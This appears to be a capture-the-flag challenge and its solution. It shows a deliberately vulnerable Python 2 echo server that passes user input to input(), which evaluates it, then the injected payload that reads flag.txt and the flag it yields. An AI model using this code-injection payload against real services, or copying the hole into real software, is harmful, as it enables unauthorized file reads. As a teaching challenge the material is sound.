I bet you thought that echo server challenges were only written in C.

`nc 108.61.168.189 8001`
Source code:
```python
#!/usr/bin/env python2

while True:
	print(input())

```

```
open("flag.txt").read()
MONSEC{d0nt_us3_py2_input}
```